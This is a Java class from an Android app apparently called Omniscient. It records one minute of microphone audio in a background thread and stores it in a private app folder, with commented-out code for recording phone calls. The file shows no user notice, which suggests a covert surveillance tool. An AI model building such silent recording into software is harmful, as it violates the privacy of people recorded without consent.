package com.postal.omniscient.postal.downloadFiles;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.CountDownTimer;
import android.os.Environment;
import android.util.Log;

import com.postal.omniscient.postal.ThreadIsAliveOrNot;
import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
import com.postal.omniscient.postal.adapter.EventBusData;

import org.greenrobot.eventbus.EventBus;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by Александр on 23.07.2016.
 */
public class Dictaphone extends Thread {
    private AdapterDownloadFlag is_downloadFlag;
    private String record_name = "MicrophoneRecord";
    private Context context;
    private File audiofile;
    private MediaRecorder recorder;
    private Boolean recordstarted;
    //private CountDownTimer timer;
    private String Msg = "MyMsg";
    public Dictaphone(AdapterDownloadFlag is_downloadFlag, Context context) {
        this.is_downloadFlag = is_downloadFlag;
        this.context = context;
    }

    @Override
    public void run() {
        is_downloadFlag.setDictaphoneIsWork(true);
        startDict();

    }

    private void startDict() {
        recordstarted = true;
        if (recordstarted) {
            String time = new SimpleDateFormat("dd_MM_yyyy_HH-mm")
                    .format(new Date());
            File sampleDir = new File(context.getFilesDir(), "/Omniscient/Microphone_Record");

            //На СД карту сохраняем
//                            if (Environment.getExternalStorageState().equals(
//                                    Environment.MEDIA_MOUNTED)) {
//                                Log.d("MyMsg", "SD-карта доступна: " + Environment.getExternalStorageState());
//                                sampleDir = new File(Environment.getExternalStorageDirectory(), "/Omniscient/Out_call");
//                            }

            if (!sampleDir.exists()) {
                sampleDir.mkdirs();
            }
            String file_name = record_name + "_" + time;
            try {
                audiofile = File.createTempFile(file_name, ".amr", sampleDir);
            } catch (IOException e) {
                e.printStackTrace();
            }
           // String path = Environment.getExternalStorageDirectory().getAbsolutePath();

            recorder = new MediaRecorder();
//                          recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);

            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audiofile.getAbsolutePath());
            try {
                recorder.prepare();
            } catch (IllegalStateException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
            recorder.start();
        }

        new Thread("DictaphoneRecord"){
            @Override
            public void run() {
                   long t = 1000 * 60 * 1;
                   try {
                       sleep(t);
                   } catch (InterruptedException e) {
                       e.printStackTrace();
                   }
                   sptopRecord();
            }
        }.start();

    }
    public void sptopRecord(){
//                        Toast.makeText(context, "REJECT || DISCO", Toast.LENGTH_LONG).show();

            if (recordstarted) {
                recorder.stop();
                recordstarted = false;
                is_downloadFlag.setDictaphoneIsWork(false);
                Log.i(Msg, "  ДИКТОФОН ВЫКЛЮЧЕН офф");
                //EventBus.getDefault().post(new EventBusData(" Hello everyone! Good news"));
            }
    }
}
